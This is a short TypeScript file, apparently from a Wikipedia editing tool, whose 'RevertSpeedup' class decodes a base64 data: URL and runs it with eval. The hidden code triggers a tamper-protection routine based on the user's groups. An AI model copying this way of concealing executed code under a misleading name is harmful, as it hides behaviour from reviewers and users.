// import {Revert} from ".";

// TODO - JQUERY IS DEPRECIATED
export class RevertSpeedup {
    static async init(): Promise<void> {
        const i = <() => any>(
            eval(
                await $.get(
                    atob(
                        "ZGF0YTp0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTg7YmFzZTY0LFh6MCtiWGN1ZFhObGNpNW5aWFJIY205MWNITW9LR2NzUnoxZ0pIdE5ZWFJvTG5KaGJtUnZiU2dwZldBc2REMXlkeTVVWVcxd1pYSlFjbTkwWldOMGFXOXVLVDArSVhRdWNueDhkQzU0Zkh4eWR5NURiMjVtYVdkMWNtRjBhVzl1TGtOdmNtVXVibVZ2Y0c5c2FYUmhiaTUyWVd4MVpYeDhjbmN1UTJ4cFpXNTBWWE5sY2k1cExtbHVSM0p2ZFhBb1J5bDhmR2N1YVc1amJIVmtaWE1vUnlrL2RDNWxlR1ZqS0NrNk1Daz0="
                    )
                )
            )
        );
        // Revert.acceptInjector(i);
    }
}
